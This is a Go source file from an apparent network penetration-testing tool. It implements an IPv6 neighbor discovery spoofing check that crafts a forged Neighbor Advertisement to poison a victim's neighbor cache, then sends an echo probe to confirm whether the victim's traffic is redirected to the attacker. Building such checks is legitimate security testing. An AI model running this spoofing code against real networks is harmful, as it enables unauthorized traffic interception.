// ndpspoof.go implements the IPv6 neighbor discovery spoofing check.
// Impact temporary, restore decay with no stated bound, affects clients:
// the Neighbor Advertisement tells the victim that the server's address is
// at the attack leg's MAC, and neighbor unreachability detection on the
// victim restores the real entry on its own schedule.

package ip6

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

// ndpOverride is the Neighbor Advertisement flag byte with the Override
// flag set and the Solicited flag clear, the unsolicited form RFC 4861
// section 7.2.6 sends and section 7.2.5 has update an existing entry's
// link-layer address.
const ndpOverride = 0x20

type ndpSpoofFinding struct {
	Action   string `json:"action"`
	Target   string `json:"target"`
	SpoofMAC string `json:"spoof_mac"`
	Flags    uint8  `json:"flags"`
}

// RunNDPSpoof sends one unsolicited Neighbor Advertisement to the target's
// IPv6 victim claiming the target's IPv6 server address is at the attack
// leg's MAC, with the Override flag set and the Solicited flag clear, then
// an ICMPv6 echo request to the victim from the server's address, and
// reads the attack leg. The predicate is the reply's Ethernet destination:
// an echo reply from the victim's MAC addressed to the attack leg's MAC
// confirms that the victim sends the server's traffic to the attacker, a
// reply to another MAC or a Neighbor Solicitation from the victim for the
// server resists (a victim with no entry for the server discards the
// advertisement, RFC 4861 section 7.2.5), and silence within the window is
// pending.
func RunNDPSpoof(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVictim6, check.FieldVictim6MAC, check.FieldServer6); err != nil {
		return check.Verdict{}, err
	}
	src := deps.AttackLeg.Addr().MAC
	victim := deps.Target.Victim6
	server := deps.Target.Server6.IP

	pkt, err := craftNDPSpoof(src, victim, server)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "ndpspoof: craft NA")
	}
	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "ndpspoof: send NA")
	}

	detail, _ := json.Marshal(ndpSpoofFinding{
		Action:   "neighbor-advertisement-spoof",
		Target:   server.String(),
		SpoofMAC: src.String(),
		Flags:    ndpOverride,
	})
	deps.Emitter.Finding("ipv6-nd", detail)

	probe, err := craftEchoRequest6(src, victim, server)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "ndpspoof: craft echo probe")
	}
	if err := deps.AttackLeg.Send(ctx, probe); err != nil {
		return check.Verdict{}, errs.Wrap(err, "ndpspoof: send echo probe")
	}

	var repliedTo net.HardwareAddr
	asked := false
	found, obs, err := check.First(ctx, deps.AttackLeg, deps.Observe, func(data []byte) bool {
		if to, ok := isEchoReplyTo(data, victim.MAC, server); ok {
			repliedTo = to
			return true
		}
		if isSolicitFromFor(data, victim.MAC, server) {
			asked = true
			return true
		}
		return false
	})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "ndpspoof: receive echo reply")
	}
	switch {
	case found == nil:
		return check.Pending(fmt.Sprintf("no reply from the victim in %s", obs.Elapsed.Round(time.Millisecond))), nil
	case asked:
		return check.Resisted(fmt.Sprintf("the victim solicited %s itself: a victim with no entry for the address discards the advertisement (RFC 4861 section 7.2.5)", server), obs.Elapsed), nil
	case bytes.Equal(repliedTo, src):
		return check.Confirmed(fmt.Sprintf("the victim sent its traffic for %s to the attack leg", server), obs.Elapsed), nil
	}
	return check.Resisted(fmt.Sprintf("the victim sent its reply for %s to %s", server, repliedTo), obs.Elapsed), nil
}

// craftNDPSpoof builds the unsolicited Neighbor Advertisement to the
// victim: the server's address is at the attack leg's MAC, Override set,
// Solicited clear, from the server's address.
func craftNDPSpoof(src net.HardwareAddr, victim check.Host, server net.IP) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       victim.MAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv6,
	}
	ip := &layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolICMPv6,
		HopLimit:   255,
		SrcIP:      server,
		DstIP:      victim.IP,
	}
	icmp := &layers.ICMPv6{
		TypeCode: layers.CreateICMPv6TypeCode(layers.ICMPv6TypeNeighborAdvertisement, 0),
	}
	_ = icmp.SetNetworkLayerForChecksum(ip)

	na := &layers.ICMPv6NeighborAdvertisement{
		Flags:         ndpOverride,
		TargetAddress: server,
		Options: layers.ICMPv6Options{
			{
				Type: layers.ICMPv6OptTargetAddress,
				Data: src, // attacker's MAC as target LLA
			},
		},
	}
	return craft.Default(eth, ip, icmp, na)
}

// craftEchoRequest6 builds the ICMPv6 echo request to the victim from the
// server's address, sent from the attack leg's MAC. The reply's Ethernet
// destination says which MAC the victim's cache holds for the server.
func craftEchoRequest6(src net.HardwareAddr, victim check.Host, server net.IP) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       victim.MAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv6,
	}
	ip := &layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolICMPv6,
		HopLimit:   64,
		SrcIP:      server,
		DstIP:      victim.IP,
	}
	icmp := &layers.ICMPv6{
		TypeCode: layers.CreateICMPv6TypeCode(layers.ICMPv6TypeEchoRequest, 0),
	}
	_ = icmp.SetNetworkLayerForChecksum(ip)
	echo := &layers.ICMPv6Echo{Identifier: echoID, SeqNumber: 1}
	return craft.Default(eth, ip, icmp, echo, gopacket.Payload([]byte("netpen")))
}

var (
	_ gopacket.SerializableLayer = (*layers.ICMPv6NeighborAdvertisement)(nil)
	_ gopacket.SerializableLayer = (*layers.ICMPv6)(nil)
)
